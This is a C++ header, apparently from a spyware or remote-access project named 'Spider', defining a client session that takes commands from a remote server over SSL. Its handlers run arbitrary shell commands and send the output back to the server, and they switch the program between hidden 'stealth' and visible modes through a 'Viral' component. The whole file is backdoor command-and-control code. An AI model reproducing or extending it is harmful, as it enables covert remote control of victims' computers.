//
// Created by doom on 08/10/17.
//

#ifndef SPIDER_CLIENT_SERVERCOMMANDSESSION_HPP
#define SPIDER_CLIENT_SERVERCOMMANDSESSION_HPP

#include <Core/CommandableSession.hpp>
#include <Viral/Viral.hpp>

namespace spi
{
    class ServerCommandSession : public CommandableSession
    {
    public:
        using Pointer = boost::shared_ptr<ServerCommandSession>;

        template <typename ...Args>
        static auto createShared(Args &&...args)
        {
            return CommandableSession::create<ServerCommandSession>(std::forward<Args>(args)...);
        }

        ServerCommandSession(net::IOManager &io, net::SSLContext &ctx, Viral &v) :
            CommandableSession(io, ctx, "server-cmd"), _viral(v)
        {
            _cmdHandler.onMessages(boost::bind(&ServerCommandSession::__handleStealthMode, this, _1),
                                   proto::MessageType::StealthMode);
            _cmdHandler.onMessages(boost::bind(&ServerCommandSession::__handleActiveMode, this, _1),
                                   proto::MessageType::ActiveMode);
            _cmdHandler.onMessages(boost::bind(&ServerCommandSession::__handleRunShell, this, _1),
                                   proto::MessageType::RunShell);
        }

        ~ServerCommandSession() noexcept override
        {
        }

        void startSession() noexcept
        {
            _log(logging::Level::Debug) << "Ready to receive commands" << std::endl;
            asyncHandshake(net::SSLConnection::HandshakeType::Server,
                           boost::bind(&ServerCommandSession::handleHandshake,
                                       shared_from_this_cast<ServerCommandSession>(),
                                       net::ErrorPlaceholder));
        }

    private:
        void __handleRunShell(const ILoggable &l)
        {
            const proto::RunShell &rsh = static_cast<const proto::RunShell &>(l);

            _log(logging::Debug) << "Executing shell command '" << rsh.cmd << "'" << std::endl;
            auto result = _viral.runShell(rsh.cmd);

            proto::RawData rd;
            rd.bytes.insert(rd.bytes.end(), result.begin(), result.end());
            Buffer buff;
            rd >> buff;

            ErrorCode ec;
            _conn.writeSome(net::BufferView(buff.data(), buff.size()), ec);
            if (!ec)
                _log(logging::Debug) << "Result of command sent to server" << std::endl;
        }

        void __handleStealthMode([[maybe_unused]] const ILoggable &s)
        {
            _log(logging::Debug) << "Got stealth mode" << std::endl;
            _viral.hide();
        }

        void __handleActiveMode([[maybe_unused]] const ILoggable &s)
        {
            _log(logging::Debug) << "Got Active mode" << std::endl;
            _viral.show();
        }

        Viral &_viral;
    };
}

#endif //SPIDER_CLIENT_SERVERCOMMANDSESSION_HPP
